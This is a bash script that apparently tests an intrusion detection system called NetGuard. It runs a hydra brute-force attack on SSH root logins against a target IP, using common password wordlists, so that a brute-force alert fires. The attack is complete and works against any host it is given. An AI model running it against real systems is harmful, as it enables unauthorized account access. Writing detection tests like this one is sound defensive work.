#!/usr/bin/env bash
# attack_bruteforce.sh — SSH brute force attack against the NetGuard target
#
# Requirements: hydra
#   sudo apt install hydra
#
# Usage: bash attack_bruteforce.sh <TARGET_IP>
# Example: bash attack_bruteforce.sh 192.168.1.50
#
# What it triggers: BruteForceRule counts TCP connections to port 22 from
# this source IP. After >=10 attempts within 60 seconds, an alert fires.
#
# The target must have SSH running (or any service on port 22).
# Use hydra -I to ignore previous restore files.

set -euo pipefail

TARGET="${1:-}"
if [[ -z "$TARGET" ]]; then
  echo "Usage: bash attack_bruteforce.sh <TARGET_IP>"
  exit 1
fi

echo "[*] Running SSH brute force against $TARGET:22"
echo "[*] NetGuard should alert after 10+ connection attempts."

# -l root          username
# -P               password list (built-in Kali wordlist)
# -t 4             4 parallel tasks
# -I               ignore restore
# -f               stop after first success
# ssh              protocol
# -s 22            port
WORDLIST="/usr/share/wordlists/rockyou.txt"
if [[ ! -f "$WORDLIST" ]]; then
  WORDLIST="/usr/share/wordlists/metasploit/unix_passwords.txt"
fi
if [[ ! -f "$WORDLIST" ]]; then
  # Fallback: generate a quick 20-entry list inline
  WORDLIST="/tmp/ng_bf_test.txt"
  printf "admin\nroot\npassword\n123456\ntoor\nkali\ntest\nguest\nnetguard\nidps\n" > "$WORDLIST"
  echo "[*] Using inline password list (wordlist not found at standard paths)."
fi

hydra -l root -P "$WORDLIST" -t 4 -I -f "ssh://${TARGET}:22" 2>&1 | head -30 || true

echo "[✓] Brute force complete. Check the NetGuard dashboard for the alert."
